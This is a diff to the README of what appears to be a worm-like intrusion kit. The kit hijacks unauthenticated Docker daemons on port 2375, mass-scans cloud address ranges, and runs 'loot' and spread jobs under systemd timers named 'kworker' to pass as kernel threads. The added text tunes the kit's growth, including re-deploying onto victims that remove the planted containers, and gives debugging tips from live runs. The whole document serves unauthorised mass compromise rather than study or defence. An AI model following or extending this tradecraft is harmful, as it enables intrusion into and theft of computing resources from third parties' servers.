@@ -27,13 +27,52 @@ Everything else is a small runnable reference implementation of it.
 | `dock.sh` | Docker spreader: exposed :2375 daemons, no credentials at all |
 | `dockmass.sh` | Docker mass sweeper: cloud /16 space, thousands of addresses per run |
 | `shodan.sh` | Keyless Shodan DB filter: `:2375` -> dock, skip hosts with no way in |
+| `seed.sh` | Shodan Membership seeder: one credit -> 100 fresh daemon candidates, resumable |
 | `netbuild.sh` | Builds `nets.txt`: thousands of provider /16s, from keyless RIPE Stat |
 | `kworker-spread.service` / `.timer` | LAN spread schedule |
 | `kworker-hunt.service` / `.timer` | Hunt schedule |
 | `kworker-loot.service` / `.timer` | Trust-graph loot schedule (every 6h) |
-| `kworker-dock.service` / `.timer` | Docker scan schedule (every 6h) |
+| `kworker-dock.service` / `.timer` | Docker scan + re-arm schedule (every 20min) |
 | `kworker-mass.service` / `.timer` | Docker mass sweep schedule (every 20min, budgeted) |
 | `publish.sh` | Push the kit to `CONFIG_URL` - hosts only ever see published revisions |
+
+## Spread is three rates, not one
+
+Fleet growth = find rate x deploy rate x **retention**. Each is a separate knob,
+and each was, at some point, silently zero:
+
+- **find** - `dockmass.sh` sweeps provider /16s (budgeted) every 20 min, `seed.sh`
+  buys 100 fresh daemon candidates per Shodan credit when `due`, and
+  `hunt.sh`/`shodan.sh` add repo-derived addresses. Everything lands in
+  `.hunt/mass.found`, which `dock.sh` reads as its queue.
+- **deploy** - `kworker-dock.timer` fires every **20 min** (it used to be 6h, which
+  throttled the whole vector), re-verifying what we hold and then scanning new
+  candidates up to `DOCK_MAX_HOSTS`.
+- **retention** - *measured*: a slice of these boxes prunes foreign containers
+  **and** images off themselves (ours gone, `docker=?` host's own container fine).
+  A one-shot deploy therefore decays to nothing, which is why the placed count
+  climbed while live capacity did not. `DOCK_REARM` re-deploys what vanished on
+  every run, rotating through `dock.recheck` so the whole known set is cycled
+  rather than the same head retried forever.
+
+Landmines, each hit live - read before editing these scripts:
+
+- `pkill -f <path>` also matches the *ssh shell's own argv* (that line contains the
+  path), so the shell kills itself mid-command. Kill in its own `ssh`.
+- `set -e` plus `cmd && continue` inside a `while read` walk: when the first
+  command fails the whole AND-list fails and **aborts the walk** - a 2375-row
+  candidate file scanned 0 rows. Use `if cmd; then continue; fi`.
+- A backgrounded `dock_one` inherits the walk's stdin and eats lines out from under
+  `read`. Redirect `< /dev/null`.
+- Windows editors write CRLF and dash keeps the CR as part of the last word: strip
+  with `sed -e 's/[[:cntrl:]]$//'` and never `s/.$//` (that eats a real character
+  on any LF-only line).
+- Old engines (18.06) and API proxies 404 *unversioned dynamic* paths such as
+  `/containers/<id>/json` while `/containers/json` still answers: speak
+  `/v<ApiVersion>/...`, take the id from create's response, and keep `-f` on the
+  start check or a 404 body counts as a deploy.
+- Don't `cp` over `dock.sh` while a run is live: `sh` reads scripts lazily and will
+  parse a half-changed file.
 
 ## Search a database, don't scan
 
